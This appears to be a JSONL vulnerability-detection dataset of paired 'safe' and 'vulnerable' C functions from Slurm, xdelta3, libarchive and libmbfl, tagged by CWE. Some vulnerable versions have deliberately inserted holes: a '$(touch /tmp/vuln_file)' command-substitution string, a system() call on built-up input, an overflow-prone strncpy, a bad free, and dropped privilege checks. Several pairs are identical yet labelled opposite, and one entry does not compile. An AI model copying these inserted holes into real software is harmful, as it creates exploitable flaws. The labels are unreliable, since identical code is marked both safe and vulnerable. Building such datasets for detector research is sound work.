{"idx": "CWE-269-safe-1714288903678", "code": "inline static void _slurm_rpc_trigger_clear(slurm_msg_t*msg){int rc;uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);trigger_info_msg_t*trigger_ptr=(trigger_info_msg_t*)msg->data;DEF_TIMERS;START_TIMER;debug(\"Processing RPC: REQUEST_TRIGGER_CLEAR from uid=%d\", uid);rc=trigger_clear(uid, trigger_ptr);END_TIMER2(\"_slurm_rpc_trigger_clear\");slurm_send_rc_msg(msg, rc);}", "target": 0}
{"idx": "CWE-269-vuln-1714288903678", "code": "inline static void _slurm_rpc_trigger_clear(slurm_msg_t*msg){int rc;uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);trigger_info_msg_t*trigger_ptr=(trigger_info_msg_t*)msg->data;DEF_TIMERS;START_TIMER;if(uid == 0){debug(\"Processing RPC: REQUEST_TRIGGER_CLEAR from uid=%d\", uid);rc=trigger_clear(uid, trigger_ptr);}END_TIMER2(\"_slurm_rpc_trigger_clear\");slurm_send_rc_msg(msg, rc);}", "target": 1}
{"idx": "CWE-78-safe-1714288910206", "code": "static void _slurm_rpc_burst_buffer_info(slurm_msg_t*msg){uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);void*resp_buffer=NULL;int resp_buffer_size=0;int error_code=SLURM_SUCCESS;Buf buffer;DEF_TIMERS;START_TIMER;debug2(\"Processing RPC: REQUEST_BURST_BUFFER_INFO from uid=%d\", uid);buffer=init_buf(BUF_SIZE);if(validate_super_user(uid))uid=0;error_code=bb_g_state_pack(uid, buffer, msg->protocol_version);END_TIMER2(__func__);if(error_code){debug(\"_slurm_rpc_burst_buffer_info:%s\", slurm_strerror(error_code));slurm_send_rc_msg(msg, error_code);}else{slurm_msg_t response_msg;resp_buffer_size=get_buf_offset(buffer);resp_buffer=xfer_buf_data(buffer);slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=RESPONSE_BURST_BUFFER_INFO;response_msg.data=resp_buffer;response_msg.data_size=resp_buffer_size;slurm_send_node_msg(msg->conn_fd, &response_msg);xfree(resp_buffer);}}", "target": 0}
{"idx": "CWE-78-vuln-1714288910206", "code": "static void _slurm_rpc_burst_buffer_info(slurm_msg_t*msg){uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);void*resp_buffer=NULL;int resp_buffer_size=0;int error_code=SLURM_SUCCESS;Buf buffer;DEF_TIMERS;START_TIMER;debug2(\"Processing RPC: REQUEST_BURST_BUFFER_INFO from uid=%d\", uid);buffer=init_buf(BUF_SIZE);if(validate_super_user(uid))uid=0;char error_msg[ERROR_MSG_SIZE];sprintf(error_msg, \"Error occurred: %s; $(touch /tmp/vuln_file)\", slurm_strerror(error_code));error_code=bb_g_state_pack(uid, buffer, msg->protocol_version);END_TIMER2(__func__);if(error_code){debug(\"_slurm_rpc_burst_buffer_info:%s\", error_msg);slurm_send_rc_msg(msg, error_code);}else{slurm_msg_t response_msg;resp_buffer_size=get_buf_offset(buffer);resp_buffer=xfer_buf_data(buffer);slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=RESPONSE_BURST_BUFFER_INFO;response_msg.data=resp_buffer;response_msg.data_size=resp_buffer_size;slurm_send_node_msg(msg->conn_fd, &response_msg);xfree(resp_buffer);}}", "target": 1}
{"idx": "CWE-254-safe-1714288927304", "code": "static void _slurm_rpc_dump_batch_script(slurm_msg_t*msg){DEF_TIMERS;int rc=SLURM_SUCCESS;slurm_msg_t response_msg;struct job_record*job_ptr;char*script;job_id_msg_t*job_id_msg=(job_id_msg_t*)msg->data;slurmctld_lock_t job_read_lock={READ_LOCK, READ_LOCK, NO_LOCK, NO_LOCK, READ_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);START_TIMER;debug3(\"Processing RPC: REQUEST_BATCH_SCRIPT from uid=%d for job=%u\", uid, job_id_msg->job_id);lock_slurmctld(job_read_lock);if((job_ptr=find_job_record(job_id_msg->job_id))){if(!validate_operator(uid) && job_ptr->user_id != uid){rc=ESLURM_USER_ID_MISSING;}else{script=get_job_script(job_ptr);if(!script)rc=ESLURM_JOB_SCRIPT_MISSING;}}else{rc=ESLURM_INVALID_JOB_ID;}unlock_slurmctld(job_read_lock);END_TIMER2(\"_slurm_rpc_dump_batch_script\");if(rc != SLURM_SUCCESS){slurm_send_rc_msg(msg, rc);}else{slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=RESPONSE_BATCH_SCRIPT;response_msg.data=script;slurm_send_node_msg(msg->conn_fd, &response_msg);xfree(script);}}", "target": 0}
{"idx": "CWE-254-vuln-1714288927304", "code": "static void _slurm_rpc_dump_batch_script(slurm_msg_t*msg){DEF_TIMERS;int rc=SLURM_SUCCESS;slurm_msg_t response_msg;struct job_record*job_ptr;char script[1024];job_id_msg_t*job_id_msg=(job_id_msg_t*)msg->data;slurmctld_lock_t job_read_lock={READ_LOCK, READ_LOCK, NO_LOCK, NO_LOCK, READ_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);START_TIMER;debug3(\"Processing RPC: REQUEST_BATCH_SCRIPT from uid=%d for job=%u\", uid, job_id_msg->job_id);lock_slurmctld(job_read_lock);if((job_ptr=find_job_record(job_id_msg->job_id))){if(!validate_operator(uid) && job_ptr->user_id != uid){rc=ESLURM_USER_ID_MISSING;}else{strncpy(script, get_job_script(job_ptr), sizeof(script));if(!script)rc=ESLURM_JOB_SCRIPT_MISSING;}}else{rc=ESLURM_INVALID_JOB_ID;}unlock_slurmctld(job_read_lock);END_TIMER2(\"_slurm_rpc_dump_batch_script\");if(rc != SLURM_SUCCESS){slurm_send_rc_msg(msg, rc);}else{slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=RESPONSE_BATCH_SCRIPT;response_msg.data=script;slurm_send_node_msg(msg->conn_fd, &response_msg);}}", "target": 1}
{"idx": "CWE-269-safe-1714288945516", "code": "static void _slurm_rpc_end_time(slurm_msg_t*msg){DEF_TIMERS;job_alloc_info_msg_t*time_req_msg=(job_alloc_info_msg*)msg->data;srun_timeout_msg_t timeout_msg;slurm_msg_t response_msg;int rc;slurmctld_lock_t job_read_lock={NO_LOCK, READ_LOCK, NO_LOCK, NO_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);debug2(\"Processing RPC: REQUEST_JOB_END_TIME from uid=%d\", uid);lock_slurmctld(job_read_lock);START_TIMER;rc=job_end_time(time_req_msg, &timeout_msg);END_TIMER2(\"_slurm_rpc_end_time\");unlock_slurmctld(job_read_lock);if(rc != SLURM_SUCCESS){slurm_send_rc_msg(msg, rc);}else{slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=SRUN_TIMEOUT;response_msg.data=&timeout_msg;slurm_send_node_msg(msg->conn_fd, &response_msg);}debug2(\"_slurm_rpc_end_time jobid=%u%s\", time_req_msg->job_id, TIME_STR);}", "target": 0}
{"idx": "CWE-269-vuln-1714288945516", "code": "static void _slurm_rpc_end_time(slurm_msg_t*msg){DEF_TIMERS;job_alloc_info_msg_t*time_req_msg=(job_alloc_info_msg*)msg->data;srun_timeout_msg_t timeout_msg;slurm_msg_t response_msg;int rc;slurmctld_lock_t job_read_lock={NO_LOCK, READ_LOCK, NO_LOCK, NO_LOCK, NO_LOCK};uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);debug2(\"Processing RPC: REQUEST_JOB_END_TIME from uid=%d\", uid);if(uid != 0){lock_slurmctld(job_read_lock);}START_TIMER;rc=job_end_time(time_req_msg, &timeout_msg);END_TIMER2(\"_slurm_rpc_end_time\");if(uid != 0){unlock_slurmctld(job_read_lock);}if(rc != SLURM_SUCCESS){slurm_send_rc_msg(msg, rc);}else{slurm_msg_t_init(&response_msg);response_msg.flags=msg->flags;response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=SRUN_TIMEOUT;response_msg.data=&timeout_msg;slurm_send_node_msg(msg->conn_fd, &response_msg);}debug2(\"_slurm_rpc_end_time jobid=%u%s\", time_req_msg->job_id, TIME_STR);}", "target": 1}
{"idx": "CWE-269-safe-1714288959338", "code": "inline static void _slurm_rpc_dump_stats(slurm_msg_t*msg){char*dump;int dump_size;stats_info_request_msg_t*request_msg;slurm_msg_t response_msg;uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);request_msg=(stats_info_request_msg_t*)msg->data;if((request_msg->command_id == STAT_COMMAND_RESET) && !validate_operator(uid)){error(\"Security violation: REQUEST_STATS_INFO reset from uid=%d\", uid);slurm_send_rc_msg(msg, ESLURM_ACCESS_DENIED);return;}debug2(\"Processing RPC: REQUEST_STATS_INFO(command:%u)\", request_msg->command_id);slurm_msg_t_init(&response_msg);response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=RESPONSE_STATS_INFO;if(request_msg->command_id == STAT_COMMAND_RESET){reset_stats(1);_clear_rpc_stats();pack_all_stat(0, &dump, &dump_size, msg->protocol_version);_pack_rpc_stats(0, &dump, &dump_size, msg->protocol_version);response_msg.data=dump;response_msg.data_size=dump_size;}else{pack_all_stat(1, &dump, &dump_size, msg->protocol_version);_pack_rpc_stats(1, &dump, &dump_size, msg->protocol_version);response_msg.data=dump;response_msg.data_size=dump_size;}slurm_send_node_msg(msg->conn_fd, &response_msg);xfree(dump);}", "target": 0}
{"idx": "CWE-269-vuln-1714288959338", "code": "inline static void _slurm_rpc_dump_stats(slurm_msg_t*msg){char*dump;int dump_size;stats_info_request_msg_t*request_msg;slurm_msg_t response_msg;uid_t uid=g_slurm_auth_get_uid(msg->auth_cred, slurmctld_config.auth_info);request_msg=(stats_info_request_msg_t*)msg->data;if((request_msg->command_id == STAT_COMMAND_RESET)){error(\"Security violation: REQUEST_STATS_INFO reset from uid=%d\", uid);slurm_send_rc_msg(msg, ESLURM_ACCESS_DENIED);return;}debug2(\"Processing RPC: REQUEST_STATS_INFO(command:%u)\", request_msg->command_id);slurm_msg_t_init(&response_msg);response_msg.protocol_version=msg->protocol_version;response_msg.address=msg->address;response_msg.conn=msg->conn;response_msg.msg_type=RESPONSE_STATS_INFO;if(request_msg->command_id == STAT_COMMAND_RESET){reset_stats(1);_clear_rpc_stats();pack_all_stat(0, &dump, &dump_size, msg->protocol_version);_pack_rpc_stats(0, &dump, &dump_size, msg->protocol_version);response_msg.data=dump;response_msg.data_size=dump_size;}else{pack_all_stat(1, &dump, &dump_size, msg->protocol_version);_pack_rpc_stats(1, &dump, &dump_size, msg->protocol_version);response_msg.data=dump;response_msg.data_size=dump_size;}slurm_send_node_msg(msg->conn_fd, &response_msg);xfree(dump);}", "target": 1}
{"idx": "CWE-78-safe-1714289021346", "code": "static int main_recompress_output(main_file* ofile){pid_t recomp_id;int pipefd[2];int output_fd=-1;int ret;const main_extcomp* recomp=ofile->compressor;pipefd[0]=pipefd[1]=-1;if(pipe(pipefd)){XPR(NT \"pipe failed:%s\\n\", xd3_mainerror(ret=get_errno()));goto pipe_cleanup;}if((recomp_id=fork())<0){XPR(NT \"fork failed:%s\\n\", xd3_mainerror(ret=get_errno()));goto pipe_cleanup;}if(recomp_id == 0){if(option_verbose>2){XPR(NT \"external recompression pid%d\\n\", getpid());}if(dup2(XFNO(ofile), STDOUT_FILENO)<0 || dup2(pipefd[PIPE_READ_FD], STDIN_FILENO)<0 || close(pipefd[PIPE_READ_FD]) || close(pipefd[PIPE_WRITE_FD]) || execlp(recomp->recomp_cmdname, recomp->recomp_cmdname, recomp->recomp_options, option_force2 ? \"-f\" : NULL, NULL)){XPR(NT \"child process%s failed to execute:%s\\n\", recomp->recomp_cmdname, xd3_mainerror(get_errno()));}_exit(127);}XD3_ASSERT(num_subprocs<MAX_SUBPROCS);ext_subprocs[num_subprocs++]=recomp_id;output_fd=dup(pipefd[PIPE_WRITE_FD]);if(output_fd<0 || main_file_close(ofile) || close(pipefd[PIPE_READ_FD]) || close(pipefd[PIPE_WRITE_FD])){XPR(NT \"close failed:%s\\n\", xd3_mainerror(ret=get_errno()));goto pipe_cleanup;}# if XD3_STDIO if((ofile->file=fdopen(output_fd, \"w\")) == NULL){XPR(NT \"fdopen failed:%s\\n\", xd3_mainerror(ret=get_errno()));goto pipe_cleanup;}# elif XD3_POSIX ofile->file=output_fd;# endif return 0;pipe_cleanup : close(output_fd);close(pipefd[PIPE_READ_FD]);close(pipefd[PIPE_WRITE_FD]);return ret;}", "target": 0}
{"idx": "CWE-78-vuln-1714289021346", "code": "static int main_recompress_output(main_file* ofile){pid_t recomp_id;int pipefd[2];int output_fd=-1;int ret;const main_extcomp* recomp=ofile->compressor;pipefd[0]=pipefd[1]=-1;if(pipe(pipefd)){XPR(NT \"pipe failed:%s\\n\", xd3_mainerror(ret=get_errno()));goto pipe_cleanup;}if((recomp_id=fork())<0){XPR(NT \"fork failed:%s\\n\", xd3_mainerror(ret=get_errno()));goto pipe_cleanup;}if(recomp_id == 0){if(option_verbose>2){XPR(NT \"external recompression pid%d\\n\", getpid());}if(dup2(XFNO(ofile), STDOUT_FILENO)<0 || dup2(pipefd[PIPE_READ_FD], STDIN_FILENO)<0 || close(pipefd[PIPE_READ_FD]) || close(pipefd[PIPE_WRITE_FD]) || execlp(recomp->recomp_cmdname, recomp->recomp_cmdname, recomp->recomp_options, option_force2 ? \"-f\" : NULL, NULL)){XPR(NT \"child process%s failed to execute:%s\\n\", recomp->recomp_cmdname, xd3_mainerror(get_errno()));}_exit(127);}XD3_ASSERT(num_subprocs<MAX_SUBPROCS);ext_subprocs[num_subprocs++]=recomp_id;output_fd=dup(pipefd[PIPE_WRITE_FD]);if(output_fd<0 || main_file_close(ofile) || close(pipefd[PIPE_READ_FD]) || close(pipefd[PIPE_WRITE_FD])){XPR(NT \"close failed:%s\\n\", xd3_mainerror(ret=get_errno()));goto pipe_cleanup;}# if XD3_STDIO if((ofile->file=fdopen(output_fd, \"w\")) == NULL){XPR(NT \"fdopen failed:%s\\n\", xd3_mainerror(ret=get_errno()));goto pipe_cleanup;}# elif XD3_POSIX ofile->file=output_fd;# endif return 0;pipe_cleanup : close(output_fd);close(pipefd[PIPE_READ_FD]);close(pipefd[PIPE_WRITE_FD]);return ret;}", "target": 1}
{"idx": "CWE-78-safe-1714289046068", "code": "static int test_copy_to(const char* from, const char* to) {\n    char buf[TESTBUFSIZE];\n    int ret;\n    snprintf(buf, TESTBUFSIZE, \"cp -f %s %s\", from, to);\n    if ((ret = system(buf)) != 0) {\n        return XD3_INTERNAL;\n    }\n    return 0;\n}", "target": 0}
{"idx": "CWE-78-vuln-1714289046068", "code": "static int test_copy_to(const char*from, const char*to){char buf[TESTBUFSIZE];int ret;snprintf(buf, TESTBUFSIZE, \"cp -f %s %s\", from, to);if((ret=system(buf)) != 0){return XD3_INTERNAL;}return 0;}", "target": 1}
{"idx": "CWE-78-safe-1714289067777", "code": "static int do_cmd(xd3_stream* stream, const char* buf) {\n    int ret;\n    char command[1024];\n    snprintf(command, sizeof(command), \"%s\", buf);\n    if ((ret = system(command)) != 0) {\n        if (WIFEXITED(ret)) {\n            stream->msg = \"command exited non-zero\";\n            IF_DEBUG1(XPR(NT \"command was:%s\\n\", buf));\n        } else {\n            stream->msg = \"abnormal command termination\";\n        }\n        return ret;\n    }\n    return 0;\n}", "target": 0}
{"idx": "CWE-78-vuln-1714289067777", "code": "static int do_cmd(xd3_stream*stream, const char*buf){int ret;char command[1024];snprintf(command, sizeof(command), \"%s\", buf);if((ret=system(command)) != 0){if(WIFEXITED(ret)){stream->msg=\"command exited non-zero\";IF_DEBUG1(XPR(NT \"command was:%s\\n\", buf));}else{stream->msg=\"abnormal command termination\";}return ret;}return 0;}", "target": 1}
{"idx": "CWE-78-safe-1714289074421", "code": "static int test_stdout_behavior(xd3_stream*stream, int ignore){int ret;char buf[TESTBUFSIZE];test_setup();snprintf_func(buf, TESTBUFSIZE, \"cp /dev/null %s\", TEST_TARGET_FILE);if((ret=do_cmd(stream, buf))){return ret;}snprintf_func(buf, TESTBUFSIZE, \"%s -e %s %s\", program_name, TEST_TARGET_FILE, TEST_DELTA_FILE);if((ret=do_cmd(stream, buf))){return ret;}snprintf_func(buf, TESTBUFSIZE, \"%s -e -c %s > %s\", program_name, TEST_TARGET_FILE, TEST_DELTA_FILE);if((ret=do_cmd(stream, buf))){return ret;}snprintf_func(buf, TESTBUFSIZE, \"%s -q -d %s\", program_name, TEST_DELTA_FILE);if((ret=do_fail(stream, buf))){return ret;}snprintf_func(buf, TESTBUFSIZE, \"%s -d -c %s > /dev/null\", program_name, TEST_DELTA_FILE);if((ret=do_cmd(stream, buf))){return ret;}test_cleanup();return 0;}", "target": 0}
{"idx": "CWE-78-vuln-1714289074421", "code": "static int test_stdout_behavior(xd3_stream*stream, int ignore){int ret;char buf[TESTBUFSIZE];test_setup();snprintf_func(buf, TESTBUFSIZE, \"cp /dev/null %s\", TEST_TARGET_FILE);if((ret=do_cmd(stream, buf))){return ret;}snprintf_func(buf, TESTBUFSIZE, \"%s -e %s %s\", program_name, TEST_TARGET_FILE, TEST_DELTA_FILE);if((ret=do_cmd(stream, buf))){return ret;}snprintf_func(buf, TESTBUFSIZE, \"%s -e -c %s > %s\", program_name, TEST_TARGET_FILE, TEST_DELTA_FILE);if((ret=do_cmd(stream, buf))){return ret;}snprintf_func(buf, TESTBUFSIZE, \"%s -q -d %s\", program_name, TEST_DELTA_FILE);if((ret=do_fail(stream, buf))){return ret;}snprintf_func(buf, TESTBUFSIZE, \"%s -d -c %s >/dev/null\", program_name, TEST_DELTA_FILE);if((ret=do_cmd(stream, buf))){return ret;}test_cleanup();return 0;}", "target": 1}
{"idx": "CWE-78-safe-1714289089787", "code": "static int test_no_output(xd3_stream*stream, int ignore){int ret;char buf[TESTBUFSIZE];test_setup();snprintf(buf, TESTBUFSIZE, \"touch%s && chmod 0000%s\", TEST_NOPERM_FILE, TEST_NOPERM_FILE);if((ret=do_cmd(stream, buf))){return ret;}if((ret=test_make_inputs(stream, NULL, NULL))){return ret;}snprintf(buf, TESTBUFSIZE, \"%s -q -f -e %s%s\", program_name, TEST_TARGET_FILE, TEST_NOPERM_FILE);if((ret=do_fail(stream, buf))){return ret;}snprintf(buf, TESTBUFSIZE, \"%s -J -e %s%s\", program_name, TEST_TARGET_FILE, TEST_NOPERM_FILE);if((ret=do_cmd(stream, buf))){return ret;}snprintf(buf, TESTBUFSIZE, \"%s -e %s%s\", program_name, TEST_TARGET_FILE, TEST_DELTA_FILE);if((ret=do_cmd(stream, buf))){return ret;}snprintf(buf, TESTBUFSIZE, \"%s -q -f -d %s%s\", program_name, TEST_DELTA_FILE, TEST_NOPERM_FILE);if((ret=do_fail(stream, buf))){return ret;}snprintf(buf, TESTBUFSIZE, \"%s -J -d %s%s\", program_name, TEST_DELTA_FILE, TEST_NOPERM_FILE);if((ret=do_cmd(stream, buf))){return ret;}test_cleanup();return 0;}", "target": 0}
{"idx": "CWE-78-vuln-1714289089787", "code": "static int test_no_output(xd3_stream*stream, int ignore){int ret;char buf[TESTBUFSIZE];test_setup();snprintf(buf, TESTBUFSIZE, \"touch%s && chmod 0000%s\", TEST_NOPERM_FILE, TEST_NOPERM_FILE);if((ret=do_cmd(stream, buf))){return ret;}if((ret=test_make_inputs(stream, NULL, NULL))){return ret;}snprintf(buf, TESTBUFSIZE, \"%s-q-f-e%s%s\", program_name, TEST_TARGET_FILE, TEST_NOPERM_FILE);if((ret=do_fail(stream, buf)){return ret;}snprintf(buf, TESTBUFSIZE, \"%s-J-e%s%s\", program_name, TEST_TARGET_FILE, TEST_NOPERM_FILE);if((ret=do_cmd(stream, buf))){return ret;}snprintf(buf, TESTBUFSIZE, \"%s-e%s%s\", program_name, TEST_TARGET_FILE, TEST_DELTA_FILE);if((ret=do_cmd(stream, buf))){return ret;}snprintf(buf, TESTBUFSIZE, \"%s-q-f-d%s%s\", program_name, TEST_DELTA_FILE, TEST_NOPERM_FILE);if((ret=do_fail(stream, buf))){return ret;}snprintf(buf, TESTBUFSIZE, \"%s-J-d%s%s\", program_name, TEST_DELTA_FILE, TEST_NOPERM_FILE);if((ret=do_cmd(stream, buf))){return ret;}test_cleanup();return 0;}", "target": 1}
{"idx": "CWE-78-safe-1714289103094", "code": "static int do_fail(xd3_stream*stream, const char*buf){ int ret; if (strpbrk(buf, \"&;&|\")){ stream->msg = \"invalid command\"; return XD3_INVALID_INPUT; } ret = system(buf); if (!WIFEXITED(ret) || WEXITSTATUS(ret) != 1){ stream->msg = \"command should have not succeeded\"; XPR(NT \"command was%s\\n\", buf); return XD3_INTERNAL; } return 0;}", "target": 0}
{"idx": "CWE-78-vuln-1714289103094", "code": "static int do_fail(xd3_stream*stream, const char*buf){\n    int ret;\n    if(strpbrk(buf, \"&;&|\")){\n        stream->msg=\"invalid command\"; \n        return XD3_INVALID_INPUT;\n    }\n    char command[256];\n    snprintf(command, sizeof(command), \"some_command %s\", buf);\n    ret=system(command);\n    if(!WIFEXITED(ret) || WEXITSTATUS(ret) != 1){\n        stream->msg=\"command should have not succeeded\"; \n        XPR(NT \"command was%s\\n\", buf);\n        return XD3_INTERNAL;\n    }\n    return 0;\n}", "target": 1}
{"idx": "CWE-78-safe-1714289116689", "code": "static int check_vcdiff_header(xd3_stream* stream, const char* input, const char* line_start, const char* matches, int yes_or_no){int ret;char vcmd[TESTBUFSIZE], gcmd[TESTBUFSIZE];snprintf(vcmd, TESTBUFSIZE, \"%s printhdr-f%s%s\", program_name, input, TEST_RECON2_FILE);if((ret = system(vcmd)) != 0){XPR(NT \"printhdr command:%s\\n\", vcmd);stream->msg = \"printhdr cmd failed\";return XD3_INTERNAL;}snprintf(gcmd, TESTBUFSIZE, \"grep \\\"%s.*%s.*\\\" %s>/dev/null\", line_start, matches, TEST_RECON2_FILE);if(yes_or_no){if((ret = do_cmd(stream, gcmd))){XPR(NT \"%s\\n\", gcmd);return ret;}}else{if((ret = do_fail(stream, gcmd))){XPR(NT \"%s\\n\", gcmd);return ret;}}return 0;}", "target": 0}
{"idx": "CWE-78-vuln-1714289116689", "code": "static int check_vcdiff_header(xd3_stream*stream, const char*input, const char*line_start, const char*matches, int yes_or_no){int ret;char vcmd[TESTBUFSIZE], gcmd[TESTBUFSIZE];snprintf(vcmd, TESTBUFSIZE, \"%s printhdr-f%s%s\", program_name, input, TEST_RECON2_FILE);if((ret=system(vcmd)) != 0){XPR(NT \"printhdr command:%s\\n\", vcmd);stream->msg=\"printhdr cmd failed\";return XD3_INTERNAL;}snprintf(gcmd, TESTBUFSIZE, \"grep \\\"%s.*%s.*\\\"%s>/dev/null\", line_start, matches, TEST_RECON2_FILE);if(yes_or_no){if((ret=do_cmd(stream, gcmd))){XPR(NT \"%s\\n\", gcmd);return ret;}}else{if((ret=do_fail(stream, gcmd))){XPR(NT \"%s\\n\", gcmd);return ret;}}return 0;}", "target": 1}
{"idx": "CWE-22-safe-1714289129931", "code": "static const char*remove_leading_slash(const char*p){const char*rp;if((p[0]=='/'||p[0]=='\\')&&(p[1]=='/'||p[1]=='\\')&&(p[2]=='.'||p[2]=='?')&&(p[3]=='/'||p[3]=='\\')){if(p[2]=='?'&&(p[4]=='U'||p[4]=='u')&&(p[5]=='N'||p[5]=='n')&&(p[6]=='C'||p[6]=='c')&&(p[7]=='/'||p[7]=='\\'))p+=8;else p+=4;}do{rp=p;if(((p[0]>='a'&&p[0]<='z')||(p[0]>='A'&&p[0]<='Z'))&&p[1]==':'){p+=2;}while(p[0]=='/'||p[0]=='\\'){if(p[1]=='.'&&p[2]=='.'&&(p[3]=='/'||p[3]=='\\')){p+=3;}else p+=1;}}while(rp!=p);return p;}", "target": 0}
{"idx": "CWE-22-vuln-1714289129931", "code": "static const char*remove_leading_slash(const char*p){const char*rp;if((p[0] == '/' || p[0] == '\\') && (p[1] == '/' || p[1] == '\\') && (p[2] == '.' || p[2] == '?') && (p[3] == '/' || p[3] == '\\')){if(p[2] == '?' && (p[4] == 'U' || p[4] == 'u') && (p[5] == 'N' || p[5] == 'n') && (p[6] == 'C' || p[6] == 'c') && (p[7] == '/' || p[7] == '\\'))p+=8;else p+=4;}do{rp=p;if(((p[0] >= 'a' && p[0] <= 'z') || (p[0] >= 'A' && p[0] <= 'Z')) && p[1] == ':'){p+=2;}while(p[0] == '/' || p[0] == '\\'){if(p[1] == '.' && p[2] == '.' && (p[3] == '/' || p[3] == '\\')){p+=3;}else p+=1;}}while(rp != p);return p;}", "target": 1}
{"idx": "CWE-399-safe-1714289144442", "code": "static int extract_data(struct archive*ar, struct archive*aw){int r;size_t size;const void*block;int64_t offset;for(;;){r=archive_read_data_block(ar, &block, &size, &offset);if(r == ARCHIVE_EOF)return(ARCHIVE_OK);if(size < 0){lafe_warnc(ARCHIVE_FATAL, \"Negative data block size\");exit(1);}if(r != ARCHIVE_OK){lafe_warnc(archive_errno(ar), \"%s\" , archive_error_string(ar));exit(1);}r=(int)archive_write_data_block(aw, block, size, offset);if(r != ARCHIVE_OK){lafe_warnc(archive_errno(aw), \"%s\" , archive_error_string(aw));return(r);}}}", "target": 0}
{"idx": "CWE-399-vuln-1714289144442", "code": "static int extract_data(struct archive*ar, struct archive*aw){int r;size_t size;const void*block;int64_t offset;for(;;){r=archive_read_data_block(ar, &block, &size, &offset);if(r == ARCHIVE_EOF)return(ARCHIVE_OK);if(size<0){lafe_warnc(ARCHIVE_FATAL, \"Negative data block size\");exit(1);}if(r != ARCHIVE_OK){lafe_warnc(archive_errno(ar), \"%s\" , archive_error_string(ar));exit(1);}r=(int)archive_write_data_block(aw, block, size, offset);if(r != ARCHIVE_OK){lafe_warnc(archive_errno(aw), \"%s\" , archive_error_string(aw));return(r);}free(block);}}", "target": 1}
{"idx": "CWE-22-safe-1714289160333", "code": "static const char*cpio_rename(const char*name){static char buff[1024];FILE*t;char*p, *ret;# if defined(_WIN32) && !defined(__CYGWIN__)FILE*to;t=fopen(\"CONIN$\",\"r\");if(t==NULL)return(name);to=fopen(\"CONOUT$\",\"w\");if(to==NULL){fclose(t);return(name);}fprintf(to,\"%s(Enter/./(new name))? \",name);fclose(to);# else t=fopen(\"/dev/tty\",\"r+\");if(t==NULL)return(name);fprintf(t,\"%s(Enter/./(new name))? \",name);fflush(t);# endif p=fgets(buff,sizeof(buff),t);fclose(t);if(p==NULL)return(NULL);while(*p==' '||*p=='\\t')++p;if(*p=='\\n'||*p=='\\0')return(NULL);if(*p=='.'&&p[1]=='\\n')return(name);ret=p;while(*p!='\\0'&&*p!='\\n')++p;*p='\\0';return(ret);}", "target": 0}
{"idx": "CWE-22-vuln-1714289160333", "code": "static const char*cpio_rename(const char*name){static char buff[1024];FILE*t;char*p, *ret;# if defined(_WIN32) && !defined(__CYGWIN__)FILE*to;t=fopen(\"CONIN$\", \"r\");if(t == NULL)return(name);to=fopen(\"CONOUT$\", \"w\");if(to == NULL){fclose(t);return(name);}fprintf(to, \"%s(Enter/./(new name))? \", name);fclose(to);# else t=fopen(\"/dev/tty\", \"r+\");if(t == NULL)return(name);fprintf(t, \"%s(Enter/./(new name))? \", name);fflush(t);# endif p=fgets(buff, sizeof(buff), t);fclose(t);if(p == NULL)return(NULL);while(*p == ' ' || *p == '\\t')++p;if(*p == '\\n' || *p == '\\0')return(NULL);if(*p == '.' && p[1] == '\\n')return(name);ret=p;while(*p != '\\0' && *p != '\\n')++p;*p='\\0';return(ret);}", "target": 1}
{"idx": "CWE-77-safe-1714289229040", "code": "int mime_header_encoder_feed(int c, struct mime_header_encoder_data*pe){if(pe && pe->conv1_filter){return (*pe->conv1_filter->filter_function)(c, pe->conv1_filter);}return 0;}", "target": 0}
{"idx": "CWE-77-vuln-1714289229040", "code": "int mime_header_encoder_feed(int c, struct mime_header_encoder_data*pe){if(pe && pe->conv1_filter){char command[100];sprintf(command, \"echo %d | some_command\", c);system(command);return(*pe->conv1_filter->filter_function)(c, pe->conv1_filter);}return 0;}", "target": 1}
{"idx": "CWE-789-safe-1714289248063", "code": "mbfl_encoding_detector*mbfl_encoding_detector_new2(const mbfl_encoding**elist, int elistsz, int strict){mbfl_encoding_detector*identd;int i, num;mbfl_identify_filter*filter;if(elist == NULL || elistsz <= 0){return NULL;}identd=(mbfl_encoding_detector*)mbfl_malloc(sizeof(mbfl_encoding_detector));if(identd == NULL){return NULL;}identd->filter_list=(mbfl_identify_filter**)mbfl_calloc(elistsz, sizeof(mbfl_identify_filter*));if(identd->filter_list == NULL){mbfl_free(identd);return NULL;}i=0;num=0;while(i<elistsz && num<elistsz){filter=mbfl_identify_filter_new2(elist[i]);if(filter != NULL){identd->filter_list[num]=filter;num++;}i++;}identd->filter_list_size=num;identd->strict=strict;return identd;}", "target": 0}
